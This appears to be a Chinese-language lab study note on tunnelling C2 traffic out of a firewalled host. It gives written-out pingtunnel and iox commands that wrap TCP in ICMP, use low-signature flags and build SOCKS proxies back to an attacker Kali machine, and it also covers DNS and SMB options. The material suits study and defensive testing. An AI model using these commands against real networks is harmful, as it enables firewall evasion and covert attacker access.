# 隧道技术 icmp dns

![1732452050196](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942043.png)

出网：看之间是否能通讯

​	c2常见的协议

隧道技术：绕过防火墙，实现通讯能够上线

出网就是出站----防火墙

  配置

将出站规则都开启，执行后面没有上线

![1732461696691](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942044.png)

将出站规则关闭：

![1732461815088](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942045.png)

打开icmp通讯：192.168.139.128为kali地址,与web机在同一个网段------------此时web防火墙入站和出站是开着。这里都是随便ping 只要能互相通信就行

![1732462308609](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942046.png)

关闭icmp协议: 

![1732462439111](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942047.png)
## icmp
这里的环境复现是：其中kali的ip  192.168.139.128       web :192.168.139.222       192.168.2.11

![1732523729550](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942048.png)

#### http--封装--->icmp
  上线  使用工具 pingtunnel

 ./pingtunnel -type server

工具将本地tcp流量用自己的6666端口流量转发到192.168.139.141:7777 上面（将tcp流量封装成icmp转发）

pingtunnel -type client -l :6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp 1 -noprint 1 -nolog 1   后门生成绑定6666，上线监听7777，上线找7777。			这个工具就是封装作用  （ 1 -noprint 1 -nolog 1  就是减少流量特征的，不打印信息）

下面本应该是在webshell页面执行，但为了省事，就直接在目标机web上进行操作：

上传工具pingtunnel，然后在能和目标机通讯的机器上 ，（这里是kali）创建一个监听：

![1732524394790](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942049.png)

执行转发命令-----前面几次没有成功是因为web机的出站icmp没有开：、

![1732525019259](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942050.png)

成功接收到：

![1732524956671](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942051.png)

生成2个监听器：1 、2

![1732525288157](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942052.png)

下面生成exe、要选择stageless的，如果选择（E）上面的那个模式，无法上线（踩坑）：这里exe的监听器为1

![1732526027873](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942053.png)

执行66666.exe则就反射到本地6666来上线，而6666又经过一系列的转发成icmp到7777才出去，2监听器监听7777成功收到web机请求上线。

![1732526222224](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942054.png)

然后用wireshark监听流量发现，web机过来的全部是icmp协议的数据包（http----->icmp封装成功）：

![1732526418330](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942055.png)

隧道一关闭、cs就掉线：

![1732526561513](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942056.png)

### dns

  使用DNS技术实现上线----使用C2自带工具。 关闭icmp通讯出站。打开dns出站规则。这里上线需要一个dns的域名网站来上线dns的exe，这就是dns协议实现上线

关闭icmp出站协议，打开dns协议

![1732526830482](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942058.png)

下面还是本应该在webshell操作。我懒的上线get，就直接在主机上演示：

这里还得需要一个dns的域名。省略这个

  ### smb

  MSF icmp实现上线。msf的dns过时，已下架。

   smb开放着，利用smb进行通讯，为入站规则

![1732529462918](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942059.png)

可以通过smb来正向连接来获取权限。这里属于横向移动知识点，后期在学

### 内网穿透:

   这里的状况（防火墙策略）是 web机器是只让web进，icmp出。隧道技术就是有一些放的口子（有一些出站的规则），这种一般都是内网穿透。演示一款工具：iox       pingtunnel                                                                                                   2222->4455->5566                   pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.128 -t 192.168.139.128:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000           （这里的key是防止别人也连接到你打pingtunnel，所以有一个key）    192.168.139.141为kali   127.0.0.1web机器，因为web机的防火墙策略。
   所以这里命令就是将web机的2222端口的tcp协议的流量封装成icmp协议给发送到192.168.139.141:4455（kali的4455端口），在kali(攻击机)./pingtunnel -type server -noprint 1 -nolog 1 -key 000000接收目标发过来的icmp流量数据，然后因为是发到自己的4455端口，所以./iox proxy -l 4455 -l 5566  用iox代理工具将4455转至5566端口。在web机上还要建立SockS节点绑定2222端口----相当于创建一个2222端口，他才能将icmp流量数据转发出去：iox.exe proxy -r 127.0.0.1:2222。类似上面的socks端口创建，因为这里目标机的防火墙策略特殊，所以采用这种方法创建socks节点。后面就一样用代理Profiex连接socks，从而实现与目标机通讯。

将web本地2222端口的TCP封装IMCP给能通讯的kali：-----已经将iox和pingtunne上传目标机了

![1732531243372](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942060.png)

接收客户端传递的ICMP：

![1732531600655](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942061.png)

端口转发，创建有socks5协议 ：

![1732531373768](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942062.png)

再在web上开放一个2222端口：

![1732535373473](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942063.png)

最后效果就是在本机能访问到目标主机，之间建立通讯。

### 总结：
使用一些封包工具，根据目标的配置，比如放行icmp，禁止其他的，那就将对应tcp之类的包的封包为icmp，让其能将流量出来，我们在监听获取到流量进而实现横向获取到权限。
都是根据目标而改变的。
